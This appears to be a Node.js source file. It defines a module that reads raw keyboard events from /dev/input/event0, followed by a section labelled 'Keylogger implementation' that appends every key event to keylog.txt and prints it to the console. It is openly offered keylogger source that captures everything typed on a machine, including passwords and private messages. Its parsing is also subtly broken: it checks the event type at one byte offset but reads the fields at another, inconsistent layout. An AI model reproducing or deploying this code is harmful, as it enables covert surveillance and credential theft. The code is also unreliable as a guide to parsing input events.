'use strict';
const fs = require('fs');
const EventEmitter = require('events').EventEmitter;
const toKey = require('./keycodes'); // Ensure you have a keycode mapping in 'keycodes.js'

const EVENT_TYPES = ['keyup', 'keypress', 'keydown'];
const EV_KEY = 1;

function Keyboard(dev) {
  this.dev = dev || 'event0';
  this.bufferSize = 24;
  this.buffer = Buffer.alloc(this.bufferSize);
  this.data = fs.createReadStream(`/dev/input/${this.dev}`);
  this.onRead();
}

Keyboard.prototype = Object.create(EventEmitter.prototype, {
  constructor: { value: Keyboard }
});

Keyboard.prototype.onRead = function onRead() {
  const self = this;

  this.data.on('data', data => {
    this.buffer = data.slice(0, self.bufferSize);
    let event = parse(this, this.buffer);
    if (event) {
      event.dev = self.dev;
      self.emit(event.type, event);
    }
  });

  this.data.on('error', err => {
    self.emit('error', err);
    throw new Error(err);
  });

}

function parse(input, buffer) {
  let event;
  if (buffer.readUInt16LE(16) === EV_KEY) {
    event = {
      timeS: buffer.readUInt32LE(0),
      timeMS: buffer.readUInt32LE(4),
      type: buffer.readUInt16LE(8),
      code: buffer.readUInt16LE(10),
      value: buffer.readUInt32LE(12)
    };
    event.keyId = toKey[event.code];
    event.type = EVENT_TYPES[event.value];
  }
  return event;
}

Keyboard.Keys = toKey;

module.exports = Keyboard;

// Keylogger implementation
const logFile = fs.createWriteStream('keylog.txt', { flags: 'a' });
const keyboard = new Keyboard('event0');

keyboard.on('keydown', event => {
  if (event.keyId) {
    logFile.write(`Key Down: ${event.keyId}\n`);
    console.log(`Key Down: ${event.keyId}`);
  }
});

keyboard.on('keypress', event => {
  if (event.keyId) {
    logFile.write(`Key Press: ${event.keyId}\n`);
    console.log(`Key Press: ${event.keyId}`);
  }
});

keyboard.on('keyup', event => {
  if (event.keyId) {
    logFile.write(`Key Up: ${event.keyId}\n`);
    console.log(`Key Up: ${event.keyId}`);
  }
});

keyboard.on('error', err => {
  console.error('Error:', err);
});
